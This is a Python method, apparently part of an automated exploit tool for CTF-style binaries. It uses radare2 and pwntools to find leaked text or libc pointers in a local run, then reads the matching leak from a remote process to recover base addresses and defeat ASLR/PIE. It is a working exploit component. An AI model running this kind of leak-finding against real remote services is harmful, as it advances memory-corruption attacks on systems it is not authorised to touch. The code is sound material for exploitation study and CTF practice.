def find_leak(self):
        """查找程序中的地址泄漏
        """
        pwn.log.info("Finding text/libc leak...")
        self.has_text_leak = False
        self.has_libc_leak = False

        r2 = init_r2(filepath, b'')
        r2.cmd('dc')
        with open(outputpath,'rb') as f:
            data = f.read()
        map_data = json.loads(r2.cmd('dmj'))
        
        if (b'0x555555' in data or b'\x55'*3 in data): # text leak, base addr is 555555...
            if b'0x555555' in data:
                aid = data.index(b'0x555555')
                leak = int(data[aid:aid+14],16)
                recv_str = data[:aid]
                recv_type = 'str'
            else:
                aid = data.rindex(b'\x55'*3)
                leak = pwn.u64(data[aid-5:aid+1].ljust(8,b'\x00'))
                recv_str = data[:aid-5]
                recv_type = 'byte'
            debug_test_base = 0
            for i in map_data:
                if elf.path in i['name']:
                    if not debug_test_base: debug_test_base = i['addr']
                    if i['addr'] <= leak and leak < i['addr_end']:
                        pwn.log.info("Found debug text leak: 0x%x"%leak)
                        self.has_text_leak = True
                        self.text_offset = leak - debug_test_base
                        break
        elif (b'0x7fff' in data or b'\xff\x7f' in data): # libc leak
            if b'0x7fff' in data:
                aid = data.index(b'0x7fff')
                leak = int(data[aid:aid+14],16)
                recv_str = data[:aid]
                recv_type = 'str'
            else:
                aid = data.rindex(b'\xff\x7f')
                leak = pwn.u64(data[aid-5:aid+1].ljust(8,b'\x00'))
                recv_str = data[:aid-5]
                recv_type = 'byte'
            debug_libc_base = 0
            for i in map_data:
                if libpath in i['name']:
                    if not debug_libc_base: debug_libc_base = i['addr']
                    if i['addr'] <= leak and leak < i['addr_end']:
                        pwn.log.info("Found debug libc leak: 0x%x"%leak)
                        self.has_libc_leak = True
                        self.libc_offset = leak - debug_libc_base
                        break

        if not self.has_text_leak and not self.has_libc_leak:
            pwn.log.error("PIE and No leak!")

        p.recvuntil(recv_str)
        if recv_type == 'str':
            leak = int(p.recv(14),16)
        elif recv_type == 'byte':
            leak = pwn.u64(p.recv(6).ljust(8,b'\x00'))

        if self.has_text_leak:
            pwn.log.info("Found remote text leak :0x%x"%leak)
            self.text_base = leak - self.text_offset
            pwn.log.info("text_base :0x%x"%self.text_base)
        elif self.has_libc_leak:
            pwn.log.info("Found remote libc leak :0x%x"%leak)
            self.libc_base = leak - self.libc_offset
            pwn.log.info("libc_base :0x%x"%self.libc_base)
    